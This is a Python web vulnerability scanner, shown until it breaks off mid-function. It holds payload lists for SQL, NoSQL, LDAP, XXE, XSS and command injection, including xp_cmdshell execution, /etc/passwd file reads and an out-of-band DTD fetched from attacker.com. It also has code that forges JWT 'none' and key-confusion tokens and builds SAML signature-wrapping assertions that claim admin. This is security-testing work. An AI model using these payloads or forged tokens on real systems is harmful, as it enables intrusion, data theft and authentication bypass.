import requests
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from tqdm import tqdm
import time
import difflib  # For better content similarity in boolean blind
import random  # For unique markers in output-based CI
import jwt  # For JWT testing
from cryptography.x509 import load_pem_x509_certificate
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import base64
import xml.etree.ElementTree as ET  # For SAML parsing
from datetime import datetime, timedelta
from lxml import etree  # For better XML handling, assume installed or note

try:
    from bs4 import BeautifulSoup
    bs4_present = True
except ImportError:
    bs4_present = False

# Database-specific SQLi payloads
# Organized by database type for better management
mssql_payloads = [
    "'; EXEC xp_cmdshell('whoami') --",
    "1'; WAITFOR DELAY '0:0:5'--",
    "' UNION SELECT 1, @@version --",
    "'; EXEC xp_cmdshell('calc.exe') --",
    "' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 114 --",
    "1 AND SLEEP(5)",
    "' AND IF(1=1, SLEEP(5), 0) --",
]

mysql_payloads = [
    "' OR SLEEP(5) --",
    "' OR SLEEP(5) = '",
    "' AND 1=2 UNION SELECT 1, version(), database() --",
    "' AND 1=2 UNION SELECT 1, user(), database() --",
    "1' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1))>64) THEN 0x31 ELSE 0x30 END)) AND '1'='1",
    "1 AND SLEEP(5)",
    "' AND IF(1=1, SLEEP(5), 0) --",
    "' OR 'x'='x' AND version() LIKE '% --",
]

postgresql_payloads = [
    "'; SELECT pg_sleep(5); --",
    "' AND 1=2 UNION SELECT 1, version(), current_database() --",
    "1 AND 123=123 AND pg_sleep(5)",
    "' || pg_sleep(5) || '",
]

oracle_payloads = [
    "1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5) AND '1'='1",
    "' AND 1=2 UNION SELECT 1, banner FROM v$version --",
    "1 AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))",
]

generic_payloads = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR '1'='1'{",
    "' OR EXISTS(SELECT * FROM users) --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
    "' OR 'x'='x' AND 1=(SELECT 1 FROM dual WHERE database() LIKE '%') --",
    "' OR 'x'='x' AND MID(version(), 1, 1) = '5' --",
    "' AND 'x'='y' AND (SELECT LENGTH(version())) > 0 --",
    "' AND 1=2 UNION SELECT 1,2,3,4,5,6,name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')--",
    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,7 FROM sysobjects WHERE xtype = 'U' --",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
]

# Combine all for default, or allow selection
sqli_payloads = generic_payloads + mssql_payloads + mysql_payloads + postgresql_payloads + oracle_payloads

# NoSQL (MongoDB-focused) payloads
nosql_payloads = [
    "' || '1'=='1",
    "'; $where: '1 == 1",
    "'; return true;",
    "{'$ne': null}",
    "{'$gt': ''}",
    "[$ne]=null",
    "{'username': {'$ne': null}}",
    ";sleep(5000);",
    "'; sleep(5000); return true;",
    # Add more as needed
]

# GraphQL Injection payloads
graphql_payloads = [
    "__schema{__typename}",
    "{__schema{types{name}}}",
    "{__typename}",
    "query{__schema{types{name}}}",
    "mutation{__schema{types{name}}}",
    " { user(id: \"1\" OR 1=1\") { id name } } ",
    # Blind or extraction payloads
    " { user(id: \"1\" AND SLEEP(5)\") { id name } } ",
    # Add more as needed
]

# XSS payloads
xss_payloads = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "\"'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "'><svg onload=alert(1)>",
    "javascript:alert(1)",
    "' onclick=alert(1)//",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    # Add more as needed
]

# Command Injection payloads for time-based detection
time_ci_payloads = [
    "; sleep 5",
    "&& sleep 5",
    "| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "; ping -c 6 127.0.0.1",  # Approx 5s
    "&& ping -c 6 127.0.0.1",
    "| ping -c 6 127.0.0.1",
    # Windows
    "& ping -n 6 127.0.0.1",
    "&& ping -n 6 127.0.0.1",
    "| ping -n 6 127.0.0.1",
    # Add more as needed
]

# Command Injection templates for output-based detection
output_ci_templates = [
    "; echo %s",
    "&& echo %s",
    "| echo %s",
    "`echo %s`",
    "$(echo %s)",
    "& echo %s",
    # Add more as needed
]

# LDAP Injection payloads
ldap_payloads = [
    "*",
    "*)",
    "*))",
    "*(",
    "*(|(cn=*",
    "admin*)",
    "*) (| (objectclass = *)",
    "(cn=*)",
    "(|(uid=*",
    ")(&",
    ")(&",
    # Add more as needed
]

# XML Injection (XXE) payloads
xml_payloads = [
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/evil.dtd" >]><foo>&xxe;</foo>""",
    # Blind XXE or OOB
    """<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/oob.dtd"> %ext; ]><root/>""",
    # Add more as needed
]

# Enhanced default error indicators for SQL and NoSQL
default_error_indicators = [
    "sql syntax",
    "mysql_fetch",
    "syntax error",
    "unclosed quotation mark",
    "unexpected end of sql",
    "warning: mysql",
    "you have an error in your sql syntax",
    "microsoft ole db provider for sql server",
    "division by zero",
    "ora-",
    "postgres",
    "invalid query",
    "sqlite",
    "odbc",
    "jdbc",
    "syntax error in sql statement",
    "mysql_num_rows",
    "mysql_error",
    "sql server error",
    "query error",
    "database error",
    "fatal error",
    "internal server error",
    "mongo",
    "mongodb",
    "syntax error in query expression",
    # Add more as needed
]

# LDAP error indicators
default_ldap_indicators = [
    "ldap",
    "invalid dn syntax",
    "invalid filter",
    "bind failed",
    "directory service",
    "openldap",
    "ldap exception",
    "naming exception",
    # Add more as needed
]

# XML error indicators (for XXE)
default_xml_indicators = [
    "xml",
    "entity",
    "doctype",
    "parser error",
    "external entity",
    "xxe",
    "file not found",
    # Content from /etc/passwd or win.ini
    "root:",
    "extensions=",
    # Add more as needed
]

# GraphQL error indicators
default_graphql_indicators = [
    "graphql",
    "query",
    "mutation",
    "introspection disabled",
    "syntax error",
    "unexpected",
    "internal error",
    # Add more as needed
]

def detect_xss(response_text, payload):
    alert_check = "alert(1)"
    if alert_check in response_text.replace("&lt;", "<").replace("&gt;", ">"):
        return True
    return False

def perform_blind_boolean_test(base_params, param, true_append, false_append, parsed, timeout, headers, normal_texts, normal_status, diff_threshold, verbosity):
    test_params = base_params.copy()
    test_params[param] += true_append
    true_query = urlencode(test_params)
    true_url = parsed._replace(query=true_query).geturl()
    try:
        resp_true = requests.get(true_url, timeout=timeout, headers=headers)
        if resp_true.status_code != normal_status:
            return False
        true_text = resp_true.text
        true_sim = difflib.SequenceMatcher(None, normal_texts[0], true_text).ratio()
    except:
        return False

    test_params[param] = base_params[param] + false_append
    false_query = urlencode(test_params)
    false_url = parsed._replace(query=false_query).geturl()
    try:
        resp_false = requests.get(false_url, timeout=timeout, headers=headers)
        if resp_false.status_code != normal_status:
            return False
        false_text = resp_false.text
        false_sim = difflib.SequenceMatcher(None, true_text, false_text).ratio()
    except:
        return False

    return true_sim > diff_threshold and false_sim < diff_threshold

def perform_blind_time_test(base_params, param, true_append, false_append, parsed, timeout, delay_sec, headers, avg_normal_time, verbosity):
    time_threshold = delay_sec * 0.8 + avg_normal_time
    test_params = base_params.copy()
    test_params[param] += true_append
    true_query = urlencode(test_params)
    true_url = parsed._replace(query=true_query).geturl()
    try:
        start = time.time()
        requests.get(true_url, timeout=timeout + delay_sec, headers=headers)
        true_time = time.time() - start
    except:
        return False

    test_params[param] = base_params[param] + false_append
    false_query = urlencode(test_params)
    false_url = parsed._replace(query=false_query).geturl()
    try:
        start = time.time()
        requests.get(false_url, timeout=timeout + delay_sec, headers=headers)
        false_time = time.time() - start
    except:
        return False

    return true_time > time_threshold and false_time < time_threshold

def test_get_url(base_url, sqli_payloads, nosql_payloads, graphql_payloads, xss_payloads, time_ci_payloads, output_ci_templates, ldap_payloads, xml_payloads, error_indicators, ldap_indicators, xml_indicators, graphql_indicators, timeout=10, verbosity=0, headers=None, blind='none', blind_ldap=False, blind_graphql=False, delay_sec=5, diff_threshold=0.95, test_nosql=False, test_graphql=False, test_xss=False, test_ci=False, test_ldap=False, test_xml=False):
    parsed = urlparse(base_url)
    if not parsed.query:
        if verbosity > 0:
            print(f"No query parameters found in {base_url}. Skipping GET test.")
        return False

    params = {k: v[0] if v else '' for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    vulnerable = False

    # Get multiple normal responses for avg time and content
    normal_times = []
    normal_texts = []
    normal_lens = []
    normal_status = None
    for _ in range(3):
        try:
            resp = requests.get(base_url, timeout=timeout, headers=headers)
            normal_times.append(resp.elapsed.total_seconds())
            normal_texts.append(resp.text)
            normal_lens.append(len(resp.text))
            if normal_status is None:
                normal_status = resp.status_code
        except requests.RequestException as e:
            if verbosity > 0:
                print(f"Failed to get normal response: {e}")
            return False
    avg_normal_time = sum(normal_times) / len(normal_times)
    avg_normal_len = sum(normal_lens) / len(normal_lens)
    normal_text = normal_texts[0].lower()

    # Blind Boolean SQLi
    if blind in ['boolean', 'both']:
        print("Testing for boolean-based blind SQLi...")
        boolean_true_append = " AND 1=1 --"
        boolean_false_append = " AND 1=2 --"
        for param in tqdm(params, desc="Boolean blind params", unit="param"):
            if perform_blind_boolean_test(params, param, boolean_true_append, boolean_false_append, parsed, timeout, headers, normal_texts, normal_status, diff_threshold, verbosity):
                print(f"[!] Boolean-based blind SQLi detected in GET parameter '{param}' at: {base_url}")
                vulnerable = True

    # Blind Time SQLi
    if blind in ['time', 'both']:
        print("Testing for time-based blind SQLi...")
        time_true_append = f" AND IF(1=1, SLEEP({delay_sec}), 0) --"
        time_false_append = f" AND IF(1=2, SLEEP({delay_sec}), 0) --"
        for param in tqdm(params, desc="Time blind params", unit="param"):
            if perform_blind_time_test(params, param, time_true_append, time_false_append, parsed, timeout, delay_sec, headers, avg_normal_time, verbosity):
                print(f"[!] Time-based blind SQLi detected in GET parameter '{param}' at: {base_url}")
                vulnerable = True

    # Error-based SQLi
    print("Testing for error-based SQLi...")
    for param in tqdm(params, desc="Testing GET parameters", unit="param"):
        for payload in sqli_payloads:
            test_params = params.copy()
            test_params[param] += payload
            test_query = urlencode(test_params)
            test_url = parsed._replace(query=test_query).geturl()
            try:
                response = requests.get(test_url, timeout=timeout, headers=headers)
                response_text = response.text.lower()
                for indicator in error_indicators:
                    if indicator in response_text and indicator not in normal_text:
                        print(f"[!] Error-based SQLi in GET parameter '{param}' detected at: {test_url}")
                        print(f" Payload: {payload}")
                        vulnerable = True
                        break
                if vulnerable:
                    break
            except:
                continue
        if vulnerable:
            break

    # NoSQL Injection
    if test_nosql:
        print("Testing for NoSQL Injection...")
        for param in tqdm(params, desc="Testing NoSQL in GET params", unit="param"):
            for payload in nosql_payloads:
                test_params = params.copy()
                test_params[param] += payload
                test_query = urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                try:
                    response = requests.get(test_url, timeout=timeout, headers=headers)
                    response_text = response.text.lower()
                    for indicator in error_indicators:
                        if indicator in response_text and indicator not in normal_text:
                            print(f"[!] NoSQL Injection in GET parameter '{param}' detected at: {test_url}")
                            print(f" Payload: {payload}")
                            vulnerable = True
                            break
                    if vulnerable:
                        break
                except:
                    continue
            if vulnerable:
                break

        # Blind Time NoSQL (if applicable, e.g., for Mongo $where)
        if blind in ['time', 'both']:
            print("Testing for time-based blind NoSQL...")
            time_true_append = f"; sleep({delay_sec * 1000}); return true;"
            time_false_append = "; return false;"
            for param in tqdm(params, desc="Time blind NoSQL params", unit="param"):
                if perform_blind_time_test(params, param, time_true_append, time_false_append, parsed, timeout, delay_sec, headers, avg_normal_time, verbosity):
                    print(f"[!] Time-based blind NoSQL detected in GET parameter '{param}' at: {base_url}")
                    vulnerable = True

    # GraphQL Injection
    if test_graphql:
        print("Testing for GraphQL Injection...")
        for param in tqdm(params, desc="Testing GraphQL in GET params", unit="param"):
            for payload in graphql_payloads:
                test_params = params.copy()
                test_params[param] += payload
                test_query = urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                try:
                    response = requests.get(test_url, timeout=timeout, headers=headers)
                    response_text = response.text.lower()
                    for indicator in graphql_indicators:
                        if indicator in response_text and indicator not in normal_text:
                            print(f"[!] GraphQL Injection in GET parameter '{param}' detected at: {test_url}")
                            print(f" Payload: {payload}")
                            vulnerable = True
                            break
                    # Check for introspection data
                    if "__schema" in response.text or "__typename" in response.text:
                        print(f"[!] GraphQL Introspection detected in GET parameter '{param}' at: {test_url}")
                        print(f" Payload: {payload}")
                        vulnerable = True
                    if vulnerable:
                        break
                except:
                    continue
            if vulnerable:
                break

        if blind_graphql:
            print("Testing for boolean-based blind GraphQL...")
            graphql_true_append = " OR 1=1"
            graphql_false_append = " OR 1=2"
            for param in tqdm(params, desc="Boolean blind GraphQL params", unit="param"):
                if perform_blind_boolean_test(params, param, graphql_true_append, graphql_false_append, parsed, timeout, headers, normal_texts, normal_status, diff_threshold, verbosity):
                    print(f"[!] Boolean-based blind GraphQL detected in GET parameter '{param}' at: {base_url}")
                    vulnerable = True

            print("Testing for time-based blind GraphQL...")
            graphql_time_true_append = f" AND SLEEP({delay_sec})"
            graphql_time_false_append = " AND 1=2"
            for param in tqdm(params, desc="Time blind GraphQL params", unit="param"):
                if perform_blind_time_test(params, param, graphql_time_true_append, graphql_time_false_append, parsed, timeout, delay_sec, headers, avg_normal_time, verbosity):
                    print(f"[!] Time-based blind GraphQL detected in GET parameter '{param}' at: {base_url}")
                    vulnerable = True

    # XSS Testing
    if test_xss:
        print("Testing for XSS...")
        for param in tqdm(params, desc="Testing XSS in GET params", unit="param"):
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param] += payload
                test_query = urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                try:
                    response = requests.get(test_url, timeout=timeout, headers=headers)
                    if detect_xss(response.text, payload):
                        print(f"[!] XSS vulnerability in GET parameter '{param}' detected at: {test_url}")
                        print(f" Payload: {payload}")
                        vulnerable = True
                        break
                except:
                    continue
            if vulnerable:
                break

    # LDAP Injection Testing
    if test_ldap:
        print("Testing for error-based LDAP Injection...")
        for param in tqdm(params, desc="Testing LDAP in GET params", unit="param"):
            for payload in ldap_payloads:
                test_params = params.copy()
                test_params[param] += payload
                test_query = urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                try:
                    response = requests.get(test_url, timeout=timeout, headers=headers)
                    response_text = response.text.lower()
                    for indicator in ldap_indicators:
                        if indicator in response_text and indicator not in normal_text:
                            print(f"[!] Error-based LDAP Injection in GET parameter '{param}' detected at: {test_url}")
                            print(f" Payload: {payload}")
                            vulnerable = True
                            break
                    if vulnerable:
                        break
                except:
                    continue
            if vulnerable:
                break

        if blind_ldap:
            print("Testing for boolean-based blind LDAP...")
            ldap_true_append = "*)(objectClass=*)"
            ldap_false_append = "*)(objectClass=nonexistent)"
            for param in tqdm(params, desc="Boolean blind LDAP params", unit="param"):
                if perform_blind_boolean_test(params, param, ldap_true_append, ldap_false_append, parsed, timeout, headers, normal_texts, normal_status, diff_threshold, verbosity):
                    print(f"[!] Boolean-based blind LDAP detected in GET parameter '{param}' at: {base_url}")
                    vulnerable = True

    # XML Injection Testing
    if test_xml:
        print("Testing for XML Injection (XXE)...")
        for param in tqdm(params, desc="Testing XML in GET params", unit="param"):
            for payload in xml_payloads:
                test_params = params.copy()
                test_params[param] = payload  # Replace for XML body simulation
                test_query = urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                try:
                    response = requests.get(test_url, timeout=timeout, headers=headers)
                    response_text = response.text.lower()
                    for indicator in xml_indicators:
                        if indicator in response_text and indicator not in normal_text:
                            print(f"[!] XML Injection (XXE) in GET parameter '{param}' detected at: {test_url}")
                            print(f" Payload: {payload}")
                            vulnerable = True
                            break
                    if vulnerable:
                        break
                except:
                    continue
            if vulnerable:
                break

    # Command Injection Testing
    if test_ci:
        # Time-based
        print("Testing for time-based command injection...")
        ci_threshold = delay_sec * 0.8 + avg_normal_time
        for param in tqdm(params, desc="Time CI params", unit="param"):
            for payload in time_ci_payloads:
                test_params = params.copy()
                test_params[param] += payload
                test_query = urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                try:
                    start = time.time()
                    requests.get(test_url, timeout=timeout + delay_sec, headers=headers)
                    ci_time = time.time() - start
                    if ci_time > ci_threshold:
                        print(f"[!] Time-based Command Injection detected in GET parameter '{param}' at: {base_url}")
                        print(f" Payload: {payload}")
                        vulnerable = True
                        break
                except:
                    continue
            if vulnerable:
                break

        # Output-based
        print("Testing for output-based command injection...")
        for param in tqdm(params, desc="Output CI params", unit="param"):
            unique = str(random.randint(100000, 999999))
            for template in output_ci_templates:
                payload = template % unique
                test_params = params.copy()
                test_params[param] += payload
                test_query = urlencode(test_params)
                test_url = parsed._replace(query=test_query).geturl()
                try:
                    response = requests.get(test_url, timeout=timeout, headers=headers)
                    if unique in response.text and unique not in normal_texts[0]:
                        print(f"[!] Output-based Command Injection detected in GET parameter '{param}' at: {base_url}")
                        print(f" Payload: {payload}")
                        vulnerable = True
                        break
                except:
                    continue
            if vulnerable:
                break

    return vulnerable

def test_forms(url, sqli_payloads, nosql_payloads, graphql_payloads, xss_payloads, time_ci_payloads, output_ci_templates, ldap_payloads, xml_payloads, error_indicators, ldap_indicators, xml_indicators, graphql_indicators, timeout, verbosity, headers, blind, blind_ldap, blind_graphql, delay_sec, diff_threshold, test_nosql, test_graphql, test_xss, test_ci, test_ldap, test_xml):
    if not bs4_present:
        print("bs4 (BeautifulSoup) not installed. Skipping form tests.")
        return

    try:
        response = requests.get(url, timeout=timeout, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        for form in tqdm(forms, desc="Testing forms", unit="form"):
            test_post_form(url, form, sqli_payloads, nosql_payloads, graphql_payloads, xss_payloads, time_ci_payloads, output_ci_templates, ldap_payloads, xml_payloads, error_indicators, ldap_indicators, xml_indicators, graphql_indicators, timeout, verbosity, headers, blind, blind_ldap, blind_graphql, delay_sec, diff_threshold, test_nosql, test_graphql, test_xss, test_ci, test_ldap, test_xml)
    except requests.RequestException as e:
        print(f"Failed to fetch page for forms: {e}")

def fetch_jwks(jwks_url):
    try:
        response = requests.get(jwks_url)
        response.raise_for_status()
        return response.json()
    except:
        print("Failed to fetch JWKS")
        return None

def base64url_decode(input):
    input += '=' * (4 - len(input) % 4)
    return base64.urlsafe_b64decode(input)

def rsa_pubkey_from_jwk(jwk):
    e = int.from_bytes(base64url_decode(jwk['e']), 'big')
    n = int.from_bytes(base64url_decode(jwk['n']), 'big')
    public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return pem.decode('utf-8')

def test_jwt(token, jwks_url=None, test_url=None, jwt_header='Authorization', jwt_prefix='Bearer ', verbosity=0):
    vulns = []
    print("=== JWT Test Report ===")
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        print("Decoded Header:")
        print(jwt.get_unverified_header(token))
        print("Decoded Claims:")
        print(decoded)
    except jwt.exceptions.DecodeError:
        print("Invalid JWT token")
        vulns.append(("Invalid Token", "The provided token is not a valid JWT format. Description: JWT tokens should have three parts separated by dots. Recommendation: Verify the token format."))
        print_vuln_report(vulns)
        return

    header = jwt.get_unverified_header(token)
    alg = header.get('alg', '').upper()
    if alg == 'NONE':
        vulns.append(("None Algorithm", "The token uses the 'none' algorithm, which means no signature is required. Description: This allows anyone to create valid tokens without signing. Recommendation: Enforce signature algorithms like HS256 or RS256."))
    else:
        # Test none algo
        parts = token.split('.')
        none_header = base64.urlsafe_b64encode(b'{"typ":"JWT","alg":"none"}').decode('utf-8').rstrip('=')
        none_token = f"{none_header}.{parts[1]}."
        print(f"Generated 'none' token: {none_token}")
        if test_url:
            test_headers = headers.copy()
            test_headers[jwt_header] = f"{jwt_prefix}{none_token}"
            try:
                resp = requests.get(test_url, headers=test_headers)
                if resp.status_code in [200, 201, 204]:
                    vulns.append(("None Algorithm Accepted", "Server accepts tokens with 'none' algorithm. Description: This is a critical vulnerability allowing unauthorized access. Recommendation: Validate the alg field and reject 'none'."))
                    print("[!] Server accepted 'none' token")
                else:
                    print(f"Server rejected 'none' token (status: {resp.status_code})")
            except:
                print("Failed to test 'none' token on server")

    if alg.startswith('HS'):
        common_secrets = ['secret', 'password', '123456', 'admin', 'jwtsecret', 'supersecret']
        for secret in common_secrets:
            try:
                jwt.decode(token, secret, algorithms=[alg])
                vulns.append(("Weak HS Secret", f"Weak secret found: {secret}. Description: Using guessable secrets compromises token integrity. Recommendation: Use strong, unique secrets of at least 256 bits."))
            except jwt.exceptions.InvalidSignatureError:
                pass
            except:
                pass

    kid = header.get('kid')
    if kid:
        vulns.append(("KID Present", "KID header present. Description: May be vulnerable to injection attacks like SQLi or path traversal if not sanitized. Recommendation: Validate and sanitize kid input."))

    # Key confusion test
    if alg == 'RS256' and jwks_url:
        jwks = fetch_jwks(jwks_url)
        if jwks:
            keys = jwks['keys']
            for key in keys:
                if key['kid'] == kid and key['kty'] == 'RSA':
                    pem = rsa_pubkey_from_jwk(key)
                    try:
                        # Verify with RS256 first
                        jwt.decode(token, pem, algorithms=['RS256'])
                        print("Original token verified with RS256")
                    except:
                        print("Original token not verified with RS256")
                    try:
                        # Test with HS256 using PEM as secret
                        jwt.decode(token, pem, algorithms=['HS256'])
                        vulns.append(("Key Confusion (RS to HS)", "RS256 token verified as HS256 using public key as secret. Description: Server confuses public key with symmetric secret. Recommendation: Strictly enforce algorithm validation."))
                    except jwt.exceptions.InvalidSignatureError:
                        print("Key confusion test failed (good)")
                    except:
                        print("Error in key confusion test")

                    # Create modified token with HS256
                    new_header = header.copy()
                    new_header['alg'] = 'HS256'
                    modified_token = jwt.encode(decoded, pem, algorithm='HS256', headers=new_header)
                    print(f"Modified HS256 token: {modified_token}")
                    if test_url:
                        test_headers = headers.copy()
                        test_headers[jwt_header] = f"{jwt_prefix}{modified_token}"
                        try:
                            resp = requests.get(test_url, headers=test_headers)
                            if resp.status_code in [200, 201, 204]:
                                vulns.append(("Key Confusion Accepted", "Server accepts HS256 token signed with public key. Description: Critical misconfiguration in signature verification. Recommendation: Ensure asymmetric and symmetric algorithms are handled separately."))
                                print("[!] Server accepted HS256 confused token")
                            else:
                                print(f"Server rejected HS256 confused token (status: {resp.status_code})")
                        except:
                            print("Failed to test HS256 confused token")

    print_vuln_report(vulns)

def print_vuln_report(vulns):
    print("\nVulnerabilities Found:")
    if vulns:
        for title, desc in vulns:
            print(f"- {title}: {desc}")
    else:
        print("No vulnerabilities found")

def test_saml(saml_token, test_url=None, saml_header='Authorization', saml_prefix='', verbosity=0):
    vulns = []
    print("=== SAML Test Report ===")
    try:
        # Assume saml_token is base64 encoded XML
        xml = base64.b64decode(saml_token).decode('utf-8')
    except:
        xml = saml_token  # Raw XML

    try:
        root = ET.fromstring(xml)
        ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds': 'http://www.w3.org/2000/09/xmldsig#'}
        assertion = root.find('saml:Assertion', ns)
        if assertion is None:
            vulns.append(("No Assertion", "No Assertion found - invalid SAML. Description: SAML must contain an Assertion element. Recommendation: Validate SAML structure."))
        signature = assertion.find('ds:Signature', ns) if assertion is not None else None
        if signature is None:
            vulns.append(("Unsigned Assertion", "Unsigned SAML Assertion - vulnerable to modification. Description: Without signature, token can be altered. Recommendation: Require signatures."))
        # Check expiration
        conditions = assertion.find('saml:Conditions', ns) if assertion is not None else None
        if conditions is None:
            vulns.append(("No Conditions", "No Conditions element - potential for replay. Recommendation: Include time conditions."))
        elif conditions is not None:
            not_after = conditions.get('NotOnOrAfter')
            if not_after:
                exp_time = datetime.fromisoformat(not_after.rstrip('Z') + '+00:00' if not not_after.endswith('Z') else not_after)
                if exp_time < datetime.utcnow():
                    vulns.append(("Expired Token", "SAML token is expired. Description: Token beyond NotOnOrAfter time. Recommendation: Enforce time bounds."))
                else:
                    print(f"Token expires at: {not_after}")
            else:
                vulns.append(("No NotOnOrAfter", "No expiration time - vulnerable to replay. Recommendation: Add time conditions."))
        print("SAML XML parsed successfully")
    except ET.ParseError:
        print("Invalid SAML XML")
        vulns.append(("Invalid XML", "SAML is not valid XML. Description: Parsing failed. Recommendation: Verify encoding and structure."))

    # Test modified SAML (remove signature)
    if test_url:
        try:
            parser = etree.XMLParser(remove_blank_text=True)
            tree = etree.fromstring(xml, parser)
            nsmap = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds': 'http://www.w3.org/2000/09/xmldsig#'}
            signatures = tree.xpath('//ds:Signature', namespaces=nsmap)
            for sig in signatures:
                sig.getparent().remove(sig)
            modified_xml = etree.tostring(tree, pretty_print=False, encoding='unicode')
            modified_token = base64.b64encode(modified_xml.encode('utf-8')).decode('utf-8')
            test_headers = headers.copy()
            test_headers[saml_header] = f"{saml_prefix}{modified_token}"
            resp = requests.get(test_url, headers=test_headers)
            if resp.status_code in [200, 201, 204]:
                vulns.append(("Unsigned SAML Accepted", "Server accepts unsigned SAML. Description: Critical - allows forged tokens. Recommendation: Require and validate signatures."))
                print("[!] Server accepted modified SAML")
            else:
                print(f"Server rejected modified SAML (status: {resp.status_code})")
        except:
            print("Failed to modify and test SAML")

    # Signature Wrapping Test
    if test_url:
        try:
            # Simple wrapping: duplicate Assertion and move signature to second
            parser = etree.XMLParser(remove_blank_text=True)
            tree = etree.fromstring(xml, parser)
            nsmap = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds': 'http://www.w3.org/2000/09/xmldsig#'}
            assertions = tree.xpath('//saml:Assertion', namespaces=nsmap)
            if assertions:
                original_assertion = assertions[0]
                signature = original_assertion.find('ds:Signature', nsmap)
                if signature is not None:
                    original_assertion.remove(signature)
                # Duplicate Assertion
                dup_assertion = etree.fromstring(etree.tostring(original_assertion))
                # Modify dup to have malicious claim, e.g., change role
                # Assume change NameID or Attribute
                name_id = dup_assertion.find('saml:Subject/saml:NameID', nsmap)
                if name_id is not None:
                    name_id.text = 'admin'  # Malicious
                # Append dup and original with sig
                tree.append(dup_assertion)
                tree.append(original_assertion)
                original_assertion.append(signature)
            modified_xml = etree.tostring(tree, pretty_print=False, encoding='unicode')
            modified_token = base64.b64encode(modified_xml.encode('utf-8')).decode('utf-8')
            test_headers = headers.copy()
            test_headers[saml_header] = f"{saml_prefix}{modified_token}"
            resp = requests.get(test_url, headers=test_headers)
            if resp.status_code in [200, 201, 204]:
                vulns.append(("Signature Wrapping", "Server accepts wrapped signature SAML. Description: Allows injection of malicious assertions. Recommendation: Canonicalize and validate XML structure."))
                print("[!] Server accepted signature wrapped SAML")
            else:
                print(f"Server rejected signature wrapped SAML (status: {resp.status_code})")
        except:
            print("Failed to test signature wrapping")

    # Replay Attack Test
    if test_url:
        try:
            test_headers = headers.copy()
            test_headers[saml_header] = f"{saml_prefix}{saml_token}"
            resp1 = requests.get(test_url, headers=test_headers)
            if resp1.status_code not in [200, 201, 204]:
                print(f"Initial SAML rejected (status: {resp1.status_code})")
            else:
                print("Initial SAML accepted")
                # Send again
                resp2 = requests.get(test_url, headers=test_headers)
                if resp2.status_code in [200, 201, 204]:
                    vulns.append(("Replay Attack", "Server accepts the same SAML token multiple times. Description: Vulnerable to replay attacks. Recommendation: Implement unique IDs or timestamps with anti-replay mechanisms."))
                    print("[!] Server accepted replayed SAML")
                else:
                    print(f"Server rejected replayed SAML (status: {resp2.status_code})")
        except:
            print("Failed to test replay attack")

    print_vuln_report(vulns)

def test_openid(id_token, issuer=None, client_id=None, nonce=None, state=None, test_url=None, jwt_header='Authorization', jwt_prefix='Bearer ', verbosity=0):
    vulns = []
    print("=== OpenID Connect Test Report ===")
    # OpenID ID token is JWT
    test_jwt(id_token, verbosity=verbosity)

    try:
        decoded = jwt.decode(id_token, options={"verify_signature": False})
        if issuer and decoded.get('iss') != issuer:
            vulns.append(("Issuer Mismatch", f"Token issuer {decoded.get('iss')} does not match expected {issuer}. Description: Potential token from wrong provider. Recommendation: Validate iss claim."))
        if client_id and decoded.get('aud') != client_id:
            vulns.append(("Audience Mismatch", f"Token audience {decoded.get('aud')} does not match client_id {client_id}. Description: Token not intended for this client. Recommendation: Validate aud claim."))
        if nonce and decoded.get('nonce') != nonce:
            vulns.append(("Nonce Mismatch", "Nonce claim does not match. Description: Potential replay or injection. Recommendation: Enforce nonce validation."))
        # Check exp, iat
        exp = decoded.get('exp')
        if exp and time.time() > exp:
